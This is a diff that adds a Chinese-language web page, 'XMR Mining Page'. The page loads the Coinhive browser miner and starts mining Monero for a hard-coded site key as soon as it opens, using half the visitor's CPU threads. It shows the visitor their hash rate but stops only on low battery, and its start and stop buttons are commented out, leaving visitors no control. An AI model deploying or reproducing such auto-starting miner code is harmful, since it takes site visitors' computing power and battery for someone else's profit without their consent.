@@ -1,0 +1,51 @@
+
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta charset="utf-8">
+<title>XMR Mining Page</title>
+</head>
+<body>
+ 
+<p style="font-size: 9pt;">
+ 
+<p style="font-size: 11pt;" id="status"></p>
+<p style="font-size: 11pt;" id="hashesPerSecond"></p>
+<p style="font-size: 11pt;" id="getTotalHashes"></p>
+<p style="font-size: 11pt;" id="stopped"></p>
+<p id="minerbutton"></p>
+
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+if (navigator.hardwareConcurrency > 1){
+    var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency/2)}
+}else{
+    var cpuConfig = {throttle:0.6}
+}
+var miner = new CoinHive.Anonymous('xEOYmN6fazsS6amOlsmbQGouKbcm3ysr', cpuConfig);
+miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+// Update stats once per second
+setInterval(function() {
+    var threadCount = miner.getNumThreads();
+    var hashesPerSecond = Math.round(miner.getHashesPerSecond());
+    var getTotalHashes = miner.getTotalHashes();
+try {
+    navigator.getBattery().then(function (battery) {
+        if (battery.level < 0.50 && battery.charging == false) {
+            miner.stop();
+            document.getElementById("stopped").innerHTML = "检测到电力不足已停止运算";
+        }
+    });
+}catch(e){console.log(e)}
+    // Output to HTML elements...
+    if (miner.isRunning()) {
+        document.getElementById("status").innerHTML = "状态: 正在使用 " + threadCount + " 个进程";
+        document.getElementById("hashesPerSecond").innerHTML = "您的计算力: " + hashesPerSecond + " H/s";
+        document.getElementById("getTotalHashes").innerHTML = "您已贡献: " + getTotalHashes + " 次Hash";
+       // document.getElementById("minerbutton").innerHTML = "<button onclick="miner.stop()">停止挖矿</button>";
+    }else{
+        document.getElementById("status").innerHTML = "状态: 沒有进行任何计算";
+        document.getElementById("hashesPerSecond").innerHTML = "您的计算力: " + 0 + " H/s";
+     /*   document.getElementById("minerbutton").innerHTML = "<button onclick="miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)">开始挖矿!</button>";*/
+    }
+}, 800);
+</script>
